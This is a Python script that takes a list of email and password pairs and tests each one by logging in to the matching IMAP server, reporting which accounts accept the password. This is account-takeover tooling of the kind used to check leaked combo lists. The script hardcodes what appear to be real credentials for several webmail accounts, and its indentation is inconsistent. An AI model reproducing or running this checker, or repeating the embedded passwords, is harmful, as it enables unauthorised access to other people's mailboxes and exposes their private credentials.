import email
import imaplib
import json
import time
import multiprocessing
import sys ,os 
import re

#email=sys.argv[1]
email="joccren@sina.com:jocc20031205"
#email="FostingAnny400@yahoo.com:159753@koko"
#email="killer.boro@bellsouth.net:mail2018"
list_mails = [x.strip() for x in email.split(',')] # to array



# def opentest (t,username, password):
#     match=re.search(r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9]+\.[a-zA-Z0-9.]*\.*$)",username)
#     if match:
#         try:
#             isp=init_ImapConfig(username.split('@')[1])[1]
#             port= init_ImapConfig(username.split('@')[1])[2]
#             mail = imaplib.IMAP4_SSL(isp,port)
#             result , data = mail.login(username,password)
#             print( [ 1 , username,password ])
#         except Exception as e:
		
#             print( [ 0 , username,password])
#     else:
#         print(  [2,username,password] )
def opentest (t,username, password):

    match=re.search(r"(^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9_.+-]+\.[a-zA-Z0-9.]*\.*$)",username)
   # matchp=re.search(r"^[a-zA-Z0-9.!@?#"$%&:';()*\+\/;\-=[\\\]\^_{|}<>`," ]",password)
    # special_char=['(',')','|'] 

    if match:
       #if special_char not:
	  
          try:

            isp=init_ImapConfig(username.split('@')[1])[1]
            port= init_ImapConfig(username.split('@')[1])[2]
#            print("isp: "+str(isp))
#            print("port: "+str(port))
            mail = imaplib.IMAP4_SSL(isp,port)
	    rc, resp =  mail.login(username,password)
	    print rc, resp

            result = { "case" :1 , "email": username, "password" : password }
 #          res=json.dumps(result)
            print(json.dumps(result))
            # print( [ 1 , username,password ])
            # f = open( "db.txt"  ,"a")
 	  except imaplib.IMAP4.error as e:
            print("Login to retrieve emails failed!")
            print(e)

          except Exception as e:
            print("Error from IMAP! Trying to reconnect...")
            print(e)
            result = { "case" :0 , "email": username, "password" : password }
            print(json.dumps(result))
	  finally:
	   print "END"
   #else:
     #  result = { "case" :2 , "email": username, "password" : password }
      # print(json.dumps(result))

def init_ImapConfig(hot):
    global ImapConfig
    ImapConfig = {}
    try:
        with open("hoster.dat", "r") as f:
            for line in f:
                if len(line) > 1 :
                    hoster = line.strip().split(':')
                    ImapConfig[hoster[0]] = (hoster[1], hoster[2])
                    if hot==hoster[0]:
                        return hoster
    except BaseException:
        print ("[ERROR]hoster.dat", "not found!")

def multiprocces(username,password,t):
    opentest(t,username,password)

for i in list_mails:
    process = multiprocessing.Process(target=multiprocces, args=(i.split(':')[0],i.split(':')[1],"multiprocessing 1"))
    process.start()



# def multiprocces(username,password,t):
#         valid=[]
#         invalid=[]
#         invformat=[]


#         # for i in list_mails:
#         result = opentest(t,username,password)
#         if( result[0] == 0 ):
#             r=invalid.append(result)
#             # allList["invalid"]= invalid
#         if( result[0] == 1 ):
#             r=valid.append(result)
#             # allList["valid"]= valid
#         if( result[0] == 2 ):
#             r=invformat.append(result)
#             # allList["invformat"]= invformat
#         print(r)
        # allList = dict()
        # allList["valid"]= valid
        # allList["invalid"]= invalid
        # allList["invformat"]= invformat

        # print(json.dumps(allList))










